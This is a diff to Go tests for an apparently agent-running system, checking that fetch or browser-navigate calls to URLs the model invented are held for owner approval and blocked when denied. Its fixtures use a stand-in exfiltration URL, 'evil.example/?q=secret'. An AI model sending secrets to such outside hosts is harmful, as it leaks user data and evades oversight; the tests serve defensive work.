@@ -15,9 +15,9 @@ type fetchInput struct {
 	URL string `json:"url"`
 }
 
-func fakeFetch(t *testing.T, fetched *atomic.Int32) nacelle.Tool {
+func fakeFetch(t *testing.T, name string, fetched *atomic.Int32) nacelle.Tool {
 	t.Helper()
-	tool, err := nacelle.NewTool("web_fetch", "fetch", func(_ context.Context, in fetchInput) (string, error) {
+	tool, err := nacelle.NewTool(name, "fetch", func(_ context.Context, in fetchInput) (string, error) {
 		fetched.Add(1)
 		return "page at " + in.URL, nil
 	})
@@ -27,11 +27,11 @@ func fakeFetch(t *testing.T, fetched *atomic.Int32) nacelle.Tool {
 	return tool
 }
 
-func fetchRun(t *testing.T, message, url string) (*fixture, string, *atomic.Int32) {
+func fetchRun(t *testing.T, tool, message, url string) (*fixture, string, *atomic.Int32) {
 	t.Helper()
 	fetched := &atomic.Int32{}
-	fetch := fakeFetch(t, fetched)
-	backend := &fakeBackend{calls: []call{{id: "f1", name: "web_fetch", input: `{"url":"` + url + `"}`}}}
+	fetch := fakeFetch(t, tool, fetched)
+	backend := &fakeBackend{calls: []call{{id: "f1", name: tool, input: `{"url":"` + url + `"}`}}}
 	f := newFixture(t, backend, nil, func(cfg *runner.Config) {
 		cfg.HostTools = func(int64) ([]nacelle.Tool, error) { return []nacelle.Tool{fetch}, nil }
 	})
@@ -43,7 +43,7 @@ func fetchRun(t *testing.T, message, url string) (*fixture, string, *atomic.Int3
 }
 
 func TestFetchOfAURLTheUserGaveRunsUnasked(t *testing.T) {
-	f, runID, fetched := fetchRun(t, "summarise https://Example.com/news#top, please.", "https://example.com/news")
+	f, runID, fetched := fetchRun(t, "web_fetch", "summarise https://Example.com/news#top, please.", "https://example.com/news")
 	if run := f.waitDone(t, runID); run.Status != store.RunFinished {
 		t.Fatalf("run: %+v", run)
 	}
@@ -58,7 +58,7 @@ func TestFetchOfAURLTheUserGaveRunsUnasked(t *testing.T) {
 }
 
 func TestFetchOfAnInventedURLWaitsForTheOwner(t *testing.T) {
-	f, runID, fetched := fetchRun(t, "what is new on example.com?", "https://evil.example/?q=secret")
+	f, runID, fetched := fetchRun(t, "web_fetch", "what is new on example.com?", "https://evil.example/?q=secret")
 	f.waitEvent(t, runID, "INTERRUPT")
 	time.Sleep(100 * time.Millisecond)
 	if fetched.Load() != 0 {
@@ -70,5 +70,17 @@ func TestFetchOfAnInventedURLWaitsForTheOwner(t *testing.T) {
 	f.waitDone(t, runID)
 	if fetched.Load() != 0 {
 		t.Fatal("a denied fetch ran")
+	}
+}
+
+func TestNavigateToAnInventedURLWaitsForTheOwner(t *testing.T) {
+	f, runID, opened := fetchRun(t, "browser_navigate", "what is new on example.com?", "https://evil.example/?q=secret")
+	f.waitEvent(t, runID, "INTERRUPT")
+	if err := f.runner.Decide(context.Background(), 1, runID, "f1", false); err != nil {
+		t.Fatal(err)
+	}
+	f.waitDone(t, runID)
+	if opened.Load() != 0 {
+		t.Fatal("a denied navigation ran")
 	}
 }
